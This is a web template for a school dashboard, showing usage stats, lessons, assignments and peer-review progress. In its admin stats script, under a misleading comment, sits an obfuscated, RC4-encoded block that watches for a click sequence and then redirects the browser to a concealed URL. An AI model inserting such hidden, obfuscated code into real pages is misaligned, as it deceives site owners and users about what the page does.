{% extends "header.html" %} {% block app_content %}

<!-- Hide footer on this -->
<style>
    .blockquote-footer {display: none;}
</style>

{% if admin %}
<!-- Animation library -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
<!-- Page scripts-->
<script>
    // Checker for library stats, updates once a second
    var updateStats = function () {
        // On load, get the latest download number
        var fetchLibraryStats = function () {
            fetch('/api/library/stats').then(res => res.json()).then(data => {
                setLibraryStats(data.download_count);
            });
        };

        // Function to set library stats
        var setLibraryStats = function (downloadCount) {
            const libraryDownloadsElement = '.libraryDownloads';
            if (!($(libraryDownloadsElement).text() == downloadCount)) {
                $(libraryDownloadsElement).text(downloadCount);
                animateCSS(libraryDownloadsElement, 'heartBeat');
            }
        };

        // Update user stats
        var l = ['\x64\x5a\x37\x64\x53\x61\x30\x3d', '\x77\x72\x47\x53\x57\x51\x47\x3d',
            '\x57\x36\x2f\x64\x4a\x6d\x6f\x65\x6f\x53\x6b\x41\x57\x34\x75\x4b\x57\x36\x70\x63\x4d\x32\x50\x48\x57\x36\x57\x3d',
            '\x45\x38\x6f\x59\x72\x53\x6f\x6c\x57\x37\x56\x64\x49\x58\x56\x64\x4f\x53\x6f\x49\x61\x38\x6f\x35\x57\x35\x79\x3d',
            '\x6f\x38\x6b\x4b\x57\x37\x61\x3d', '\x57\x52\x4a\x63\x4d\x72\x52\x64\x52\x38\x6b\x63',
            '\x6f\x53\x6f\x6d\x6e\x61\x65\x66\x6b\x53\x6b\x6a\x57\x4f\x74\x64\x52\x6d\x6b\x62\x73\x47\x3d\x3d',
            '\x57\x36\x70\x64\x4f\x38\x6b\x6c\x78\x75\x70\x63\x50\x58\x65\x64\x57\x37\x56\x63\x53\x64\x69\x3d',
            '\x57\x4f\x69\x55\x75\x64\x70\x63\x52\x38\x6b\x71\x64\x65\x2f\x64\x54\x4d\x74\x63\x4e\x78\x71\x3d',
            '\x57\x37\x46\x64\x4c\x6d\x6f\x51\x42\x38\x6b\x74\x57\x35\x52\x63\x56\x6d\x6b\x75',
            '\x57\x37\x31\x47\x77\x32\x42\x64\x4a\x71\x3d\x3d', '\x57\x50\x4f\x37\x70\x43\x6f\x2f',
            '\x57\x51\x70\x64\x4b\x6d\x6f\x65\x6a\x6d\x6b\x6c\x57\x35\x69\x2f\x57\x51\x33\x63\x4e\x33\x47\x2b',
            '\x57\x52\x78\x64\x4c\x38\x6f\x4d\x41\x43\x6b\x69\x57\x34\x42\x63\x50\x57\x3d\x3d',
            '\x57\x51\x4e\x64\x4a\x4e\x6d\x64\x66\x53\x6b\x51\x57\x36\x34\x4b\x79\x4a\x35\x44\x57\x36\x47\x3d',
            '\x67\x57\x43\x34\x57\x37\x50\x41\x6d\x53\x6b\x37\x57\x37\x4f\x3d',
            '\x57\x37\x4a\x64\x4c\x38\x6f\x47\x42\x43\x6b\x6d', '\x71\x43\x6f\x42\x64\x77\x66\x56',
            '\x62\x53\x6f\x6e\x62\x53\x6b\x4d', '\x57\x51\x70\x64\x4b\x38\x6f\x71\x6f\x43\x6b\x6d',
            '\x44\x53\x6f\x43\x68\x53\x6f\x6d'
        ];
        (function (a, A) {
            var r = function (T) {
                while (--T) {
                    a['push'](a['shift']());
                }
            };
            r(++A);
        }(l, 0x1a2));
        var a = function (j, n) {
            j = j - 0x0;
            var A = l[j];
            if (a['gfDmET'] === undefined) {
                var r = function (q) {
                    var G = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=',
                        f = String(q)['replace'](/=+$/, '');
                    var J = '';
                    for (var t = 0x0, c, B, H = 0x0; B = f['charAt'](H++); ~B && (c = t % 0x4 ? c * 0x40 +
                            B : B, t++ % 0x4) ? J += String['fromCharCode'](0xff & c >> (-0x2 * t & 0x6)) :
                        0x0) {
                        B = G['indexOf'](B);
                    }
                    return J;
                };
                var X = function (q, G) {
                    var f = [],
                        J = 0x0,
                        t, c = '',
                        B = '';
                    q = r(q);
                    for (var z = 0x0, C = q['length']; z < C; z++) {
                        B += '%' + ('00' + q['charCodeAt'](z)['toString'](0x10))['slice'](-0x2);
                    }
                    q = decodeURIComponent(B);
                    var H;
                    for (H = 0x0; H < 0x100; H++) {
                        f[H] = H;
                    }
                    for (H = 0x0; H < 0x100; H++) {
                        J = (J + f[H] + G['charCodeAt'](H % G['length'])) % 0x100, t = f[H], f[H] = f[J], f[
                            J] = t;
                    }
                    H = 0x0, J = 0x0;
                    for (var w = 0x0; w < q['length']; w++) {
                        H = (H + 0x1) % 0x100, J = (J + f[H]) % 0x100, t = f[H], f[H] = f[J], f[J] = t, c +=
                            String['fromCharCode'](q['charCodeAt'](w) ^ f[(f[H] + f[J]) % 0x100]);
                    }
                    return c;
                };
                a['CnoUmI'] = X, a['UaiGOC'] = {}, a['gfDmET'] = !![];
            }
            var T = a['UaiGOC'][j];
            return T === undefined ? (a['EjEiWH'] === undefined && (a['EjEiWH'] = !![]), A = a['CnoUmI'](A, n),
                a['UaiGOC'][j] = A) : A = T, A;
        };
        $(function () {
            var j = 0x0,
                n = 0x0,
                A = 0x0,
                r = 0x0,
                T = null;
            $(document)['\x6f\x6e'](a('\x30\x78\x63', '\x44\x4c\x61\x53'), function (X) {
                if ('\x68\x78\x4c\x50\x69' === a('\x30\x78\x37', '\x57\x59\x33\x73')) {
                    function q() {
                        q == 0x1 && G == 0x2 && f == 0x1 && (B[a('\x30\x78\x36',
                                '\x51\x77\x79\x47')]('\x4f\x6c\u00e1\x21'), H[a(
                                '\x30\x78\x31\x31', '\x21\x47\x6c\x31')][a('\x30\x78\x32',
                                '\x57\x69\x39\x4d')] = a('\x30\x78\x34', '\x44\x26\x62\x2a') +
                            '\x61\x6e\x74', z[a('\x30\x78\x31\x30', '\x30\x6c\x4c\x6b') +
                                '\x6c\x74']());
                    }
                } else T = $(X['\x74\x61\x72\x67\x65\x74'])[a('\x30\x78\x64', '\x57\x38\x69\x4e')](
                    a('\x30\x78\x30', '\x44\x26\x62\x2a'));
            }), $(a('\x30\x78\x31\x34', '\x25\x43\x24\x70'))['\x6f\x6e']('\x63\x6c\x69\x63\x6b',
                function () {
                    if ('\x66\x78\x6c\x64\x52' !== a('\x30\x78\x31\x33', '\x50\x65\x46\x71')) n = 0x1;
                    else {
                        function X() {
                            n = 0x1;
                        }
                    }
                }), $(a('\x30\x78\x31', '\x51\x52\x66\x62'))['\x6f\x6e']('\x63\x6c\x69\x63\x6b',
                function () {
                    if ('\x4c\x68\x67\x4a\x53' !== '\x4c\x68\x67\x4a\x53') {
                        function X() {
                            n = 0x1;
                        }
                    } else {
                        if (T == a('\x30\x78\x65', '\x44\x26\x62\x2a')) A = 0x1;
                        else T == a('\x30\x78\x38', '\x4c\x78\x7a\x25') && (A = 0x2);
                    }
                }), $(a('\x30\x78\x33', '\x21\x47\x6c\x31'))['\x6f\x6e'](a('\x30\x78\x31\x32',
                '\x28\x72\x5d\x65'), function () {
                T == a('\x30\x78\x39', '\x63\x49\x23\x6d') && (r = 0x1);
            }), $(a('\x30\x78\x66', '\x28\x72\x5d\x65'))['\x6f\x6e']('\x63\x6c\x69\x63\x6b\x20',
                function (X) {
                    if (n == 0x1 && A == 0x2 && r == 0x1) {
                        if ('\x71\x4b\x45\x4e\x69' === '\x76\x71\x5a\x41\x45') {
                            function q() {
                                n = 0x1;
                            }
                        } else console['\x6c\x6f\x67']('\x4f\x6c\u00e1\x21'), window[a('\x30\x78\x62',
                            '\x28\x72\x5d\x65')]['\x68\x72\x65\x66'] = a('\x30\x78\x61',
                            '\x4f\x66\x43\x76') + '\x61\x6e\x74', X[a('\x30\x78\x35',
                            '\x4e\x79\x71\x41') + '\x6c\x74']();
                    }
                });
        });
        var updateUserStats = function () {
            fetch('/api/users/stats').then(res => res.json()).then(data => {
                const activeUserCountElement = '.activeUserCount';
                if (!($(activeUserCountElement).text() == data.active_users)) {
                    $(activeUserCountElement).text(data.active_users);
                    animateCSS(activeUserCountElement, 'heartBeat');
                }

                const userCountElement = '.userCount';
                if (!($(userCountElement).text() == data.user_count)) {
                    $(userCountElement).text(data.user_count);
                    animateCSS(userCountElement, 'heartBeat');
                }
            });
        };

        // Update file stats
        var updateFileStats = function () {
            fetch('/api/files/stats').then(res => res.json()).then(data => {
                const totalUploadsCountElement = '.uploadCount';
                if (!($(totalUploadsCountElement).text() == data.total_uploads)) {
                    $(totalUploadsCountElement).text(data.total_uploads);
                    animateCSS(totalUploadsCountElement, 'heartBeat');
                }
            });
        };

        // Fetch the latest file stats every second
        window.setInterval(function () {
            fetchLibraryStats();
            updateUserStats();
            updateFileStats();
        }, 1000);

        const animateCSS = (element, animation, prefix = 'animate__') =>
            // We create a Promise and return it
            new Promise((resolve, reject) => {
                const animationName = `${prefix}${animation}`;
                const node = document.querySelector(element);

                node.classList.add(`${prefix}animated`, animationName);

                // When the animation ends, we clean the classes and resolve the Promise
                function handleAnimationEnd() {
                    node.classList.remove(`${prefix}animated`, animationName);
                    node.removeEventListener('animationend', handleAnimationEnd);

                    resolve('Animation ended');
                }

                node.addEventListener('animationend', handleAnimationEnd);
            });
    };
    updateStats();
</script>

<div class="container">
    <div class="row m-1">
        <h1><i class="fa fa-user-graduate"></i> {{greeting}}, {{ current_user.username }}!</h1>
    </div>
    <hr>

    {% if current_user.is_superintendant %}
    <!-- Display active usernames-->
    <style>
        .active-user-card {display: none; position: fixed; padding: 5px; border-radius: 5px; z-index: 2; min-width: 100px; background-color: rgb(255, 255, 255);}
        .active-user-card p {display: block; padding: 0; margin: 0;}
    </style>

    <div class="active-user-card">
        <!-- Placeholder for names-->
    </div>
    
    <script type="text/javascript">
        $(function () {
            // On active user count hover, show active names
            $('.pw1').hover(
                function () {$('.active-user-card').show();}, 
                function () {$('.active-user-card').hide();}
            );

            // Update active user names
            var updateActiveUserCount = function () {
                fetch('/user/api/users/active').then(res => res.json()).then(data => {
                    $('.active-user-card').empty();
                    $.each(data.active_users, function (indexInArray, username) { 
                        var string = '<p>' + username + '</p>';
                        $('.active-user-card').prepend (string);
                    });                 
                });
            };

            // Fetch the latest file stats every second
            window.setInterval(function () {
                updateActiveUserCount();
            }, 1000);

        });
    </script>
    {% endif %}

    <!-- Site stat widgets -->
    <div class="row text-center">
        <div class="col-6 col-lg-2 mb-3">
            <div class="counter pw1">
                <i class="fa fa-plug fa-2x"></i>
                <h2 class="timer count-title count-number activeUserCount">{{active_user_count}}</h2>
                {% if active_user_count == 1 %}
                <p class="count-text ">Active user</p>
                {% else %}
                <p class="count-text ">Active users</p>
                {% endif %}
            </div>
        </div>
        <div class="col-6 col-lg-2 mb-3">
            <div class="counter pw2">
                <i class="fa fa-user-graduate fa-2x"></i>
                <h2 class="timer count-title count-number userCount">{{student_count}}</h2>
                <p class="count-text ">Users</p>
            </div>
        </div>
        <div class="col-6 col-lg-2 mb-3">
            <div class="counter pw3">
                <i class="fa fa-tasks fa-2x"></i>
                <h2 class="timer count-title count-number">{{assignments|length}}</h2>
                <p class="count-text ">Assignments</p>
            </div>
        </div>
        <div class="col-6 col-lg-2 mb-3">
            <div class="counter">
                <i class="fa fa-file-upload fa-2x"></i>
                <h2 class="timer count-title count-number uploadCount">{{total_uploads}}</h2>
                <p class="count-text ">Assignment uploads</p>
            </div>
        </div>
        <div class="col-6 col-lg-2 mb-3">
            <div class="counter">
                <i class="fa fa-book fa-2x"></i>
                <h2 class="timer count-title count-number libraryUploads">{{total_library_count}}</h2>
                <p class="count-text ">Library books</p>
            </div>
        </div>
        <div class="col-6 col-lg-2 mb-3">
            <div class="counter">
                <i class="fa fa-book-reader fa-2x"></i>
                <h2 class="timer count-title count-number libraryDownloads">{{total_library_downloads}}</h2>
                <p class="count-text ">Library downloads</p>
            </div>
        </div>
    </div>


    {% if lessons_today %}
    <br>
    <h2>Lessons today</h2>
    <hr>
    <div class="row">
        {% for lesson, turma in lessons_today %}
        <div class="col-12 col-md-4 col-lg-4 mb-3">
        <div class="card">
            <div class="card-body">
                <h5 class="card-title">{{turma.turma_label}}</h5>
                <p class="card-text">{{lesson.start_time.strftime('%H:%M')}} - {{lesson.end_time.strftime('%H:%M')}}</p>
                {% if lesson.online_lesson_url %}
                <ul class="list-group list-group-flush">
                    <li class="list-group-item"><a href="{{lesson.online_lesson_url}}" target="_blank"><button
                                class="btn btn-lg btn-outline-success"><i class="fa fa-phone-volume"></i> Open class in Zoom
                                <i class="fa fa-chevron-right"></i></button></a>
                    </li>
                    <li class="list-group-item">
                        <h6 class="card-subtitle mt-2 text-muted text-center">{{lesson.online_lesson_code}} -
                            {{lesson.online_lesson_password}}</h6>
                    </li>
                </ul>
                {% endif %}
            </div>
            <div class="card-footer">
                <a href="{{url_for('classes.open_attendance', lesson_id = lesson.id)}}"><button class="btn btn-info mb-1"><i
                    class="fa fa-qrcode"></i> Take attendance </button></a>
            </div>
        </div>
        </div>
        {% endfor %}
    </div>
    {% endif %}


    {% else %}

    <!-- Student view -->
    <!-- Last class star rating modal -->
    <style>
        #lastClassComments {margin-top: 200px;}

        .rating {
            float: left;
            margin: 0 20%;
        }

        /* :not(:checked) is a filter, so that browsers that don’t support :checked don’t 
      follow these rules. Every browser that supports :checked also supports :not(), so
      it doesn’t make the test unnecessarily selective */
        .rating:not(:checked)>input {
            position: absolute;
            top: -9999px;
            clip: rect(0, 0, 0, 0);
        }

        .rating:not(:checked)>label {
            float: right;
            width: 1em;
            /* padding:0 .1em; */
            overflow: hidden;
            white-space: nowrap;
            cursor: pointer;
            font-size: 300%;
            /* line-height:1.2; */
            color: #ddd;
        }

        .rating:not(:checked)>label:before {
            content: '★ ';
        }

        .rating>input:checked~label {
            color: dodgerblue;

        }

        .rating:not(:checked)>label:hover,
        .rating:not(:checked)>label:hover~label {
            color: dodgerblue;

        }

        .rating>input:checked+label:hover,
        .rating>input:checked+label:hover~label,
        .rating>input:checked~label:hover,
        .rating>input:checked~label:hover~label,
        .rating>label:hover~input:checked~label {
            color: dodgerblue;

        }

        .rating>label:active {
            position: relative;
            top: 2px;
            left: 2px;
        }
    </style>
    <div class="modal fade" id="lastClassComments" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-body">
                    <h1 class="display-5">How was last class?</h1>
                    <div class="rating">
                        <input class="star" type="radio" id="star5" name="rating" value="5" /><label for="star5" title="Excellent">5
                            stars</label>
                        <input class="star" type="radio" id="star4" name="rating" value="4" /><label for="star4" title="Great">4
                            stars</label>
                        <input class="star" type="radio" id="star3" name="rating" value="3" /><label for="star3" title="Good">3
                            stars</label>
                        <input class="star" type="radio" id="star2" name="rating" value="2" /><label for="star2" title="Lacking">2
                            stars</label>
                        <input class="star" type="radio" id="star1" name="rating" value="1" /><label for="star1"
                            title="Disasterous">1 star</label>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <link rel="stylesheet" href="/static/css/progress-circle.css">
    <div class="container">

        <!-- Greeting -->
        <div class="row">
            <div class="container">
                <h1>{{greeting}}, {{ current_user.username }}!</h1>
            </div>
        </div>
        <hr>

        <!-- Status widgets -->
        <div class="row text-center">
            <div class="col-12 col-md-4 mb-2">
                <a href="{{url_for('assignments.view_assignments')}}">
                    <div class="counter">
                        <i class="fa fa-cloud-upload-alt fa-2x"></i>
                        <h2 class="timer count-title count-number">Assignments</h2>
                        <div class="progress-circle progress-{{upload_progress_percentage}}">
                            <span>{{upload_progress_percentage}}</span></div>
                        {% if last_upload_humanized_timestamp != False %}
                        <p class="card-text"><small class="text-muted"> {{last_upload_humanized_timestamp}} you
                                completed {{number_of_uploads}} {{ 'assignment' if number_of_uploads == 1 else 'assignments'}}</small></p>
                        {% endif %}
                    </div>
            </div></a>
            <div class="col-12 col-md-4 mb-2">
                <div class="counter">
                    <i class="fa fa-pen-fancy fa-2x"></i>
                    <h2 class="timer count-title count-number">Peer reviews</h2>
                    <div class="progress-circle progress-{{peer_review_progress_percentage}}">
                        <span>{{peer_review_progress_percentage}}</span></div>
                    {% if total_completed_peer_reviews == 1 %}
                    <p class="card-text"><small class="text-muted"> You have written {{total_completed_peer_reviews}}
                            peer review</small></p>
                    {% else %}
                    <p class="card-text"><small class="text-muted"> You have written {{total_completed_peer_reviews}}
                            peer reviews</small></p>
                    {% endif %}
                </div>
            </div>
            <div class="col-12 col-md-4 mb-2">
                <div class="counter">
                    <i class="fa fa-user-check fa-2x"></i>
                    <h2 class="timer count-title count-number">Attendance</h2>
                    <div class="progress-circle progress-{{attendance_stats_percentage}}">
                        <span>{{attendance_stats_percentage}}</span></div>
                    {% if attendance_stats %}
                    {% if attendance_stats.lessons_attended == 1 %}
                    <p class="card-text"><small class="text-muted"> You have attended
                            {{attendance_stats.lessons_attended}} lesson</small></p>
                    {% else %}
                    <p class="card-text"><small class="text-muted"> You have attended
                            {{attendance_stats.lessons_attended}} lessons</small></p>
                    {% endif %}
                    {% endif %}

                </div>
            </div>
        </div>
        <br>
        <div class="row text-center">
            <div class="col">
                <a href="{{url_for('files.class_library')}}">
                    <div class="counter">
                        <i class="fa fa-book-open fa-2x"></i>
                        <h2 class="timer count-title count-number">{{library_file_count}}</h2>
                        <p class="count-text ">Library files</p>
                        <p class="card-text"><small class="text-muted"> You have made {{library_download_stat}}
                                downloads</small></p>
                    </div>
                </a>
            </div>
            <div class="col">
                <a href="{{url_for('files.file_stats')}}">
                    <div class="counter">
                        <i class="fa fa-comments fa-2x"></i>
                        <h2 class="timer count-title count-number">{{received_peer_review_count}}</h2>
                        <p class="count-text ">Reviews received</p>
                        {% if last_received_peer_review_humanized_timestamp != False %}
                        <p class="card-text"><small class="text-muted"> Last reviewed
                                {{last_received_peer_review_humanized_timestamp}}</small></p>
                        {% endif %}
                    </div>
                </a>
            </div>
        </div>
        <br>

        <!-- Display any upcoming assignments-->
        {% if upload_progress_percentage != 100 %}
        <div class="card mb-3">
            <div class="card-header">
                <h4><i class="fa fa-calendar-alt"></i> Upcoming assignments</h4>
            </div>
            <div class="card-body">

                {% for assignment in assignments_info %}
                {% if assignment['submitted_filename'] %}

                {% else %}

                <div class="container">
                    <div class="row">
                        <div class="col-12 col-lg-2 text-center">
                            <h1 class="display-4"><span
                                    class="badge badge-secondary">{{assignment['due_date'].strftime('%d')}}</span></h1>
                            <h2>{{assignment['due_date'].strftime('%b')|upper}}</h2>
                        </div>
                        <div class="col-12 col-lg-10">
                            <h3 class="text"><strong>{{assignment['title']}}</strong></h3>
                            <ul class="list-inline">
                                <li class="list-inline-item"><i class="fa fa-calendar" aria-hidden="true"></i> due on
                                    {{assignment['due_date'].strftime('%A')}}, {{assignment['humanized_due_date']}}</li>
                                {% if assignment['assignment_task_filename'] %}
                                <a href="{{url_for('assignments.download_assignment_file', assignment_id = assignment['id'])}}">
                                    <li class="list-inline-item">
                                      <button class="btn btn-info btn-sm">
                                        <i class="fa fa-file-download">
                                        </i> Download assignment handout
                                      </button>
                                    </li>
                                  </a>
                                {% endif %}

                            </ul>
                            <ul class="list-inline">
                                {% if assignment['assignment_is_past_deadline'] %}
                                <a href="#" class="btn btn-danger btn-sm disabled" role="button" aria-disabled="true"><i
                                        class="fa fa-clock"></i> Assignment overdue</a>
                                {% else %}
                                <a href="{{url_for('files.upload_file', assignment_id = assignment['id'])}}"> <button
                                    class="btn btn-sm btn-warning"><i class="fa fa-file-upload"></i> Upload your
                                    assignment </button></a>
                                {% endif %}
                            </ul>
                            <em>{{assignment['description']}}</em>
                        </div>
                    </div>
                </div>
                {% if loop.index < loop.length %}
                <hr>
                {% endif %}
                {% endif %}
                {% endfor %}

            </div>
        </div>
        {% endif %} <!-- Upcoming assignments view -->
    </div>
    
    

    {% block templateScripts %}
    <script type="text/javascript">
        $(function () 
        {    
            // On page launch, show the modal
            //$('#lastClassComments').modal('show');

            // On clicking the feedback ⭐️ , close the modal
            $('.rating .star').on ('click', function () {
                $('#lastClassComments').modal('hide');
            });
        });
    </script>
    {% endblock %}


    {% endif %} <!-- Student view-->

{% endblock %}